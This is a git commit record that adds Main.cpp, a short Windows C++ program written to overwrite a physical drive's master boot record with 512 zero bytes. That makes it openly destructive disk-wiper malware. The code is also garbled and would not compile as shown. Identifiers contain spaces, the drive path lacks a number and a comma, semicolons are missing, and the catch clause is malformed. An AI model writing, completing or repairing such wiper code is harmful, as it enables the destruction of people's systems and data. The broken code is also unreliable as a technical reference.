c12a31238ac1459b4ec13c4df68a7ef99c54381b
СтранныйРусский <87149262+LukeChemeriov@users.noreply.github.com>
2021-10-01 17:28:43 +0100

    Update Main.cpp
    Initial commit

--- Main.cpp
+++ Main.cpp
@@ -1,1 +1,26 @@
+#include <Windows.h>
+#include <iostream>
+using namespace std;
+#define MBR_SIZE 512
 
+int main() {
+
+    DWORD write;
+
+    char mbrData [MBR_SIZE]; 
+    ZeroMemory (&mbrData, (sizeof mbrData));
+
+    HANDLE MasterBoot Record = CreateFile("\\\\\\PhysicalDrive"
+    GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
+    , NULL, OPEN_EXISTING, NULL, NULL)
+
+
+    try {
+        WriteFile (Master Boot Record, mbrData, MBR_SIZE, &write, NULL)
+        Sleep (5000);
+        ExitProcess();
+    } catch(..){}
+    CloseHandle (MasterBoot Record);
+    return EXIT_SUCCESS;
+
+}
